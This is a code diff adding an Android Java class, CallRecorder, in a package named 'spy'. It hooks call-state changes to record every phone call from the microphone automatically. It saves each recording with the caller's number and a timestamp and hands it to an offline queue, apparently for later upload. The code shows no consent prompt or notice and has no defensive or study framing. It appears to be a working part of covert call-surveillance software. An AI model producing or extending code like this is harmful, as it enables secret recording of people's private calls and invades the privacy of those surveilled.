@@ -1,0 +1,67 @@
+package com.gauravhanna.spy;
+
+import android.media.MediaRecorder;
+import android.os.Handler;
+import android.os.Looper;
+import android.telephony.PhoneStateListener;
+import android.telephony.TelephonyManager;
+import android.content.Context;
+import java.io.IOException;
+
+public class CallRecorder {
+    private MediaRecorder recorder;
+    private String currentFilePath;
+    private boolean isRecording = false;
+    private TelephonyManager telephonyManager;
+    private Context context;
+    private Handler handler = new Handler(Looper.getMainLooper());
+
+    public CallRecorder(Context context) {
+        this.context = context;
+        telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
+    }
+
+    private PhoneStateListener phoneStateListener = new PhoneStateListener() {
+        @Override
+        public void onCallStateChanged(int state, String phoneNumber) {
+            switch (state) {
+                case TelephonyManager.CALL_STATE_IDLE:
+                    if (isRecording) {
+                        stopRecording(phoneNumber);
+                    }
+                    break;
+                case TelephonyManager.CALL_STATE_OFFHOOK:
+                    startRecording(phoneNumber);
+                    break;
+            }
+        }
+    };
+
+    private void startRecording(String phoneNumber) {
+        try {
+            currentFilePath = context.getExternalFilesDir(null) + "/call_" + System.currentTimeMillis() + ".3gp";
+            recorder = new MediaRecorder();
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            recorder.setOutputFile(currentFilePath);
+            recorder.prepare();
+            recorder.start();
+            isRecording = true;
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void stopRecording(String phoneNumber) {
+        if (recorder != null && isRecording) {
+            recorder.stop();
+            recorder.release();
+            recorder = null;
+            isRecording = false;
+            // Add to offline queue
+            OfflineQueue.addRecording(context, currentFilePath, phoneNumber, System.currentTimeMillis());
+        }
+    }
+}
